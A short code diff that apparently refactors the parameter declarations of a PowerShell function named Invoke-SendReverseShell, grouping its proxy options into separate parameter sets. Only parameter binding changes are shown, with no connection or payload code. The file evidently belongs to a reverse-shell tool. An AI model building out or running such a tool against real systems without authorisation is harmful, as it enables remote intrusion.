@@ -27,7 +27,7 @@ function Invoke-SendReverseShell
 
 	#>
 
-	[CmdletBinding()]
+	[CmdletBinding(DefaultParameterSetName="main")]
 		Param (
 
     	[Parameter(Mandatory = $True)]
@@ -41,13 +41,13 @@ function Invoke-SendReverseShell
         [Parameter(Mandatory = $False)]
         [Int]$TimeOut = 60,
 
-        [Parameter(Mandatory = $False)]      
+        [Parameter(Mandatory = $False, ParameterSetName="AutoProxy")]      
         [Switch]$UseDefaultProxy,
 
-        [Parameter(Mandatory = $False)]      
+        [Parameter(Mandatory = $False, ParameterSetName="ManualProxy")]      
         [String]$ProxyName,
 
-        [Parameter(Mandatory = $False)]
+        [Parameter(Mandatory = $False, ParameterSetName="ManualProxy")]
         [Int]$ProxyPort = 8080
     )
 
